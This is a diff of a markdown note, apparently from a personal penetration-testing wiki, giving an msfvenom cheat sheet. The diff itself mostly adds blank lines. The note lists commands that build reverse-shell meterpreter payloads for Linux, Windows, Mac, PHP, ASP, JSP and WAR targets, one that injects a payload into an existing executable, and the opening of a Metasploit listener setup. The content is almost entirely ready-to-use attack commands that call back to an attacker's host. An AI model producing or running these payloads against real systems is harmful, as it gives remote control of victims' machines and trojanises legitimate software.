@@ -9,12 +9,20 @@ updated_at: '2023-05-29T16:48:52.690130+00:00'
 
 # msfvenom
 
+
+
 **Command** ([[Linux ELF binary]]):
 
 ```bash
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
 
 ```
+
+
+
+
+
+
 
 **Command** ([[Windows EXE binary]]):
 
@@ -23,12 +31,24 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your 
 
 ```
 
+
+
+
+
+
+
 **Command** ([[32 Bit]]):
 
 ```bash
 msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=10.10.12.XX lport=1337 -f exe > shell32.exe
 
 ```
+
+
+
+
+
+
 
 **Command** ([[64Bit]]):
 
@@ -37,12 +57,24 @@ msfvenom -a x64 --platform Windows -p windows/x64/meterpreter/reverse_tcp lhost=
 
 ```
 
+
+
+
+
+
+
 **Command** ([[Windows Service]]):
 
 ```bash
 msfvenom -p windows/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> EXITFUNC=thread -f exe-service > shell-service.exe
 
 ```
+
+
+
+
+
+
 
 **Command** ([[Mac]]):
 
@@ -51,6 +83,12 @@ msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port t
 
 ```
 
+
+
+
+
+
+
 **Command** ([[PHP]]):
 
 ```bash
@@ -58,7 +96,13 @@ msfvenom -p php/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port
 
 ```
 
+
+
+
+
 If you use php/reverse_php open the output file with an editor and add `<?php` and `?>` within the script.
+
+
 
 **Command** ([[ASP]]):
 
@@ -67,12 +111,24 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your 
 
 ```
 
+
+
+
+
+
+
 **Command** ([[JSP]]):
 
 ```bash
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp
 
 ```
+
+
+
+
+
+
 
 **Command** ([[WAR]]):
 
@@ -81,12 +137,24 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port 
 
 ```
 
+
+
+
+
+
+
 **Command** ([[Inject payload into an existing exe file]]):
 
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -x <template EXE> -f exe > <output.exe>
 
 ```
+
+
+
+
+
+
 
 **Command** ([[dep bypass payload]]):
 
@@ -95,7 +163,19 @@ windows/meterpreter/reverse_nonx_tcp
 
 ```
 
+
+
+
+
+
+
 **Code**: [[
 msfconsole
 use exploit/multi/handler
 set payload ]]
+
+
+
+
+
+
